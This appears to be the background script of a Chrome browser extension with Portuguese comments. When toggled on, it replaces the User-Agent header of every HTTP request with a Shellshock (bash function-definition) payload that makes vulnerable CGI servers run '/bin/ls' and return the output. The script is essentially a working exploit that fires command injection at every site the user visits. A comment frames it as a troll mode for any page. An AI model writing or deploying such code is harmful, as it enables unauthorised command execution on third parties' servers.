function UASHELLSHOCKACTIVE(){
    var id=localStorage.getItem('UASHS_isactive');
    if(id=='0') {
        localStorage.setItem('UASHS_isactive',1);
        chrome.browserAction.setIcon({path:"icon/noactive_icon.png"});
    } else { 
        localStorage.setItem('UASHS_isactive',0);
        chrome.browserAction.setIcon({path:"icon/active_icon.png"});
    }

}

chrome.browserAction.onClicked.addListener(UASHELLSHOCKACTIVE);

chrome.webRequest.onBeforeSendHeaders.addListener(

    //sUserAgenteString = "() { test;};echo 'Content-type: text/plain'; echo; echo; /bin/ls";

    function(sReq) {
      // Varrendo header para lozalizar variavel User-Agent
      // no header
      var aHeaders = sReq.requestHeaders;
      console.log(aHeaders);

      if(localStorage.getItem('UASHS_isactive') == '0') {
          aHeaders.forEach(function(header, i) {
            if (header.name == 'User-Agent') {
                header.value = "() { test;};echo 'Content-type: text/plain'; echo; echo; /bin/ls";
            }
          });
      }
      return {requestHeaders: aHeaders};
    },
    {
        // Modo troll master ativo qualquer página  ;)
    urls: [
            "http://*/*"
        ]
    },
    [
      "blocking",
      "requestHeaders"
    ]
);
